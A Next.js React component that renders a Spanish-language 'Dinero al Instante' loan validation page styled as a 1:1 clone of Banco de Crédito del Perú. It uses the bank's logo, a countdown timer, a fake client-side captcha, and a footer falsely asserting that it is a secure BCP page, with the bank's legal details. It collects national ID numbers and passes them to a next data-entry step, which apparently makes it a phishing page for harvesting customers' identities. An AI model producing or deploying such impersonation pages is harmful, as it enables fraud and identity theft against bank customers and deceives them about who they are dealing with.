// app/prestamo/validacion/ValidacionClient.tsx
"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";

export default function ValidacionClient({
  amount,
  payDay,
}: {
  amount: string;
  payDay: string;
}) {
  const router = useRouter();

  // Header: contador como en el BCP (300s → 0s)
  const [seconds, setSeconds] = useState(300);
  useEffect(() => {
    const t = setInterval(() => setSeconds((s) => Math.max(0, s - 1)), 1000);
    return () => clearInterval(t);
  }, []);

  // Form
  const [docType, setDocType] = useState<"DNI" | "CE">("DNI");
  const [docNumber, setDocNumber] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [errors, setErrors] = useState<{ docNumber?: string; captcha?: string }>(
    {}
  );

  // Captcha placeholder
  const [code, setCode] = useState(() => randomCode(6));
  const refreshCode = () => setCode(randomCode(6));

  // Validación mínima (sin mostrar mensajes si quieres clon 1:1)
  const validar = () => {
    const e: typeof errors = {};
    if (!docNumber) e.docNumber = "Ingresa tu documento";
    if (!captcha) e.captcha = "Ingresa el código";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const submit = (ev: React.FormEvent) => {
    ev.preventDefault();
    if (!validar()) return;
    const qs = new URLSearchParams({
      amount: String(Number(amount) || 0),
      payDay,
      docType,
      docNumber,
    }).toString();
    router.push(`/prestamo/datos?${qs}`);
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header azul con logo + contador */}
      <header className="bg-[color:var(--brand)] text-white">
        <div className="container-max h-12 flex items-center justify-between">
          <div className="flex items-center gap-2">
            {/* Usa tu asset real si lo tienes en /public */}
            <img src="/bcp-logo.svg" alt="BCP" className="h-5" />
          </div>
          <div className="flex items-center gap-2 text-sm font-semibold">
            <span>{seconds} segundos</span>
            {/* ícono cronómetro */}
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <path d="M9 2h6M12 8v5l3 2" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
              <circle cx="12" cy="14" r="7" stroke="currentColor" strokeWidth="2"/>
            </svg>
          </div>
        </div>
      </header>

      {/* Volver + Tarjeta principal */}
      <main className="container-max py-6">
        <button
          onClick={() => router.back()}
          className="flex items-center gap-2 text-[#2F476B] mb-3"
        >
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
            <path d="M15 18l-6-6 6-6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
          Volver
        </button>

        <div className="rounded-[18px] border border-[color:var(--line)] bg-white shadow-[0_8px_28px_rgba(0,0,0,.08)] p-5 md:p-6 max-w-[640px]">
          <h1 className="text-2xl font-bold text-[color:var(--brand)]">Dinero al Instante</h1>
          <p className="text-[15px] text-[#5A6B84] mt-1">Valida tu identidad para continuar</p>

          <form onSubmit={submit} className="mt-5 space-y-4">
            {/* FILA: Tipo doc + Nro (grupo unido como en el BCP) */}
            <div className="flex w-full">
              <div className="relative w-[124px]">
                <select
                  value={docType}
                  onChange={(e) => setDocType(e.target.value as "DNI" | "CE")}
                  className="h-[56px] w-full pl-4 pr-8 border border-[color:var(--line)] rounded-l-[12px] text-[#0E1B2A] bg-white outline-none"
                >
                  <option value="DNI">DNI</option>
                  <option value="CE">CE</option>
                </select>
                {/* chevron */}
                <svg className="absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" width="18" height="18" viewBox="0 0 24 24" fill="#2F476B">
                  <path d="M7 10l5 5 5-5H7z" />
                </svg>
              </div>
              <input
                placeholder="Nro de documento"
                value={docNumber}
                onChange={(e) => setDocNumber(e.target.value)}
                className={`h-[56px] flex-1 px-4 border border-l-0 border-[color:var(--line)] rounded-r-[12px] bg-white outline-none placeholder:text-[color:var(--placeholder)] ${errors.docNumber ? "ring-2 ring-[#DD1831] border-[#DD1831]" : ""}`}
              />
            </div>

            {/* FILA: Captcha (izq) + Código (der) */}
            <div className="flex w-full items-center">
              <div className="h-[56px] w-[220px] border border-[color:var(--line)] rounded-l-[12px] bg-white flex items-center justify-center select-none">
                {/* placeholder captcha: código en mayúsculas con tracking amplio */}
                <span className="tracking-widest font-semibold text-[#2F476B]">{code}</span>
              </div>
              <input
                placeholder="Código"
                value={captcha}
                onChange={(e) => setCaptcha(e.target.value)}
                className={`h-[56px] flex-1 px-4 border border-l-0 border-[color:var(--line)] rounded-r-[12px] bg-white outline-none placeholder:text-[color:var(--placeholder)] ${errors.captcha ? "ring-2 ring-[#DD1831] border-[#DD1831]" : ""}`}
              />
            </div>

            {/* Cambiar código (en naranja, alineado al captcha) */}
            <button
              type="button"
              onClick={refreshCode}
              className="text-[#FF7A00] text-[14px] -mt-1"
              aria-label="Cambiar código"
            >
              Cambiar código
            </button>

            <button type="submit" className="btn-bcp">Continuar</button>
          </form>
        </div>

        {/* Footer legal como en el BCP (texto simplificado) */}
        <div className="max-w-[640px] mx-auto text-center text-[12px] text-[#8AA0B6] mt-6 space-y-1">
          <div className="flex items-center justify-center gap-2">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
              <path d="M12 1l9 5v12l-9 5-9-5V6l9-5z" stroke="currentColor" strokeWidth="1.4"/>
              <path d="M8 12h8M12 8v8" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round"/>
            </svg>
            <span>
              Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate con nosotros al (01) 311-9898 o a través de nuestros medios digitales.
            </span>
          </div>
          <div className="pt-3 border-t border-[#E5EDF6]">
            Banco de Crédito del Perú S.A<br/>
            RUC: 20100047218<br/>
            © 2025 VIABCP.com<br/>
            Todos los derechos reservados
          </div>
        </div>
      </main>
    </div>
  );
}

// ————— helpers —————
function randomCode(n: number) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let out = "";
  for (let i = 0; i < n; i++) out += chars[Math.floor(Math.random() * chars.length)];
  return out;
}
